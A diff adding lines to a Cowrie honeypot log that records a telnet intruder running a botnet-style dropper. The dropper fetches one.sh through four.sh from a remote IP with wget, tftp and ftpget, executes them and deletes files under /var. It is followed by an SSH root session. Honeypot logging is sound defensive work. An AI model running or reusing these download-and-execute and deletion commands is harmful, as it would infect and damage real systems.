@@ -3507,3 +3507,50 @@
 2017-03-05T22:51:59+0000 [CowrieTelnetTransport,42635,211.107.81.140] Command found: sh 
 2017-03-05T22:51:59+0000 [CowrieTelnetTransport,42635,211.107.81.140] Command found: bash 
 2017-03-05T22:51:59+0000 [CowrieTelnetTransport,42635,211.107.81.140] Command not found: shell
+2017-03-05T22:52:01+0000 [CowrieTelnetTransport,42635,211.107.81.140] CMD: cd /tmp || cd /var/run || cd /dev/shm || cd /mnt || cd /var;rm -f *;busybox wget http://212.24.100.86/one.sh || wget http://212.24.100.86/one.sh || busybox tftp -r two.sh -g 212.24.100.86 || tftp -r two.sh -g 212.24.100.86 || busybox tftp 212.24.100.86 -c get three.sh || tftp 212.24.100.86 -c get three.sh || busybox ftpget 212.24.100.86 four.sh four.sh || ftpget 212.24.100.86 four.sh four.sh;sh one.sh || sh two.sh || sh three.sh || sh four.sh;rm -f *;exit
+2017-03-05T22:52:01+0000 [CowrieTelnetTransport,42635,211.107.81.140] Command found: cd /tmp
+2017-03-05T22:52:01+0000 [CowrieTelnetTransport,42635,211.107.81.140] Command found: cd /var/run
+2017-03-05T22:52:01+0000 [CowrieTelnetTransport,42635,211.107.81.140] Command found: cd /dev/shm
+2017-03-05T22:52:01+0000 [CowrieTelnetTransport,42635,211.107.81.140] Command found: cd /mnt
+2017-03-05T22:52:01+0000 [CowrieTelnetTransport,42635,211.107.81.140] Command found: cd /var
+2017-03-05T22:52:01+0000 [CowrieTelnetTransport,42635,211.107.81.140] Command found: rm -f /var/log /var/run /var/mail /var/tmp /var/opt /var/local /var/backups /var/spool /var/lock /var/lib /var/cache
+2017-03-05T22:52:01+0000 [CowrieTelnetTransport,42635,211.107.81.140] Command found: busybox wget http://212.24.100.86/one.sh
+2017-03-05T22:52:01+0000 [CowrieTelnetTransport,42635,211.107.81.140] Command found: wget http://212.24.100.86/one.sh
+2017-03-05T22:52:01+0000 [cowrie.commands.wget.HTTPProgressDownloader#info] Starting factory <HTTPProgressDownloader: http://212.24.100.86/one.sh>
+2017-03-05T22:52:02+0000 [HTTPPageDownloader (TLSMemoryBIOProtocol),client] Command found: wget http://212.24.100.86/one.sh
+2017-03-05T22:52:02+0000 [cowrie.commands.wget.HTTPProgressDownloader#info] Starting factory <HTTPProgressDownloader: http://212.24.100.86/one.sh>
+2017-03-05T22:52:02+0000 [cowrie.commands.wget.HTTPProgressDownloader#info] Stopping factory <HTTPProgressDownloader: https://212.24.100.86/one.sh>
+2017-03-05T22:52:02+0000 [HTTPPageDownloader (TLSMemoryBIOProtocol),client] Command found: busybox tftp -r two.sh -g 212.24.100.86
+2017-03-05T22:52:02+0000 [HTTPPageDownloader (TLSMemoryBIOProtocol),client] Command found: tftp -r two.sh -g 212.24.100.86
+2017-03-05T22:52:02+0000 [HTTPPageDownloader (TLSMemoryBIOProtocol),client] Command found: tftp -r two.sh -g 212.24.100.86
+2017-03-05T22:52:02+0000 [HTTPPageDownloader (TLSMemoryBIOProtocol),client] Command found: busybox tftp 212.24.100.86 -c get three.sh
+2017-03-05T22:52:02+0000 [HTTPPageDownloader (TLSMemoryBIOProtocol),client] Command found: tftp 212.24.100.86 -c get three.sh
+2017-03-05T22:52:02+0000 [HTTPPageDownloader (TLSMemoryBIOProtocol),client] Command found: tftp 212.24.100.86 -c get three.sh
+2017-03-05T22:52:02+0000 [HTTPPageDownloader (TLSMemoryBIOProtocol),client] Command found: busybox ftpget 212.24.100.86 four.sh four.sh
+2017-03-05T22:52:02+0000 [HTTPPageDownloader (TLSMemoryBIOProtocol),client] Command found: ftpget 212.24.100.86 four.sh four.sh
+2017-03-05T22:52:02+0000 [HTTPPageDownloader (TLSMemoryBIOProtocol),client] FTP connect failed: host=212.24.100.86, port=21, err=[Errno 111] Connection refused
+2017-03-05T22:52:02+0000 [HTTPPageDownloader (TLSMemoryBIOProtocol),client] Command found: ftpget 212.24.100.86 four.sh four.sh
+2017-03-05T22:52:02+0000 [HTTPPageDownloader (TLSMemoryBIOProtocol),client] FTP connect failed: host=212.24.100.86, port=21, err=[Errno 111] Connection refused
+2017-03-05T22:52:02+0000 [HTTPPageDownloader (TLSMemoryBIOProtocol),client] Command found: sh one.sh
+2017-03-05T22:52:02+0000 [HTTPPageDownloader (TLSMemoryBIOProtocol),client] Command found: sh two.sh
+2017-03-05T22:52:02+0000 [HTTPPageDownloader (TLSMemoryBIOProtocol),client] Command found: sh three.sh
+2017-03-05T22:52:02+0000 [HTTPPageDownloader (TLSMemoryBIOProtocol),client] Command found: sh four.sh
+2017-03-05T22:52:02+0000 [HTTPPageDownloader (TLSMemoryBIOProtocol),client] Command found: rm -f /var/log /var/mail /var/tmp /var/opt /var/local /var/backups /var/spool /var/lib /var/cache
+2017-03-05T22:52:02+0000 [HTTPPageDownloader (TLSMemoryBIOProtocol),client] Command found: exit 
+2017-03-05T22:52:02+0000 [HTTPPageDownloader (TLSMemoryBIOProtocol),client] Process ended. Telnet Session disconnected
+2017-03-05T22:52:02+0000 [cowrie.commands.wget.HTTPProgressDownloader#info] Stopping factory <HTTPProgressDownloader: https://212.24.100.86/one.sh>
+2017-03-05T22:52:02+0000 [CowrieTelnetTransport,42635,211.107.81.140] Closing TTY Log: log/tty/20170305-225151-None-42635i.log after 11 seconds
+2017-03-05T22:52:02+0000 [CowrieTelnetTransport,42635,211.107.81.140] honeypot terminal protocol connection lost [Failure instance: Traceback (failure with no frames): <class 'twisted.internet.error.ConnectionDone'>: Connection was closed cleanly.
+	]
+2017-03-05T22:52:02+0000 [CowrieTelnetTransport,42635,211.107.81.140] Connection lost after 30 seconds
+2017-03-05T22:52:05+0000 [CowrieTelnetTransport,42626,89.248.163.3] Connection lost after 138 seconds
+2017-03-05T22:52:47+0000 [HoneyPotSSHTransport,9234,116.31.116.51] NEW KEYS
+2017-03-05T22:52:47+0000 [HoneyPotSSHTransport,9234,116.31.116.51] starting service 'ssh-userauth'
+2017-03-05T22:52:47+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,9234,116.31.116.51] 'root' trying auth 'none'
+2017-03-05T22:52:49+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,9234,116.31.116.51] 'root' authenticated with 'none'
+2017-03-05T22:52:49+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,9234,116.31.116.51] starting service 'ssh-connection'
+2017-03-05T22:52:50+0000 [HoneyPotSSHTransport,9234,116.31.116.51] Got remote error, code 11
+	reason: 
+2017-03-05T22:52:50+0000 [HoneyPotSSHTransport,9234,116.31.116.51] avatar root logging out
+2017-03-05T22:52:50+0000 [HoneyPotSSHTransport,9234,116.31.116.51] connection lost
+2017-03-05T22:52:50+0000 [HoneyPotSSHTransport,9234,116.31.116.51] Connection lost after 64 seconds
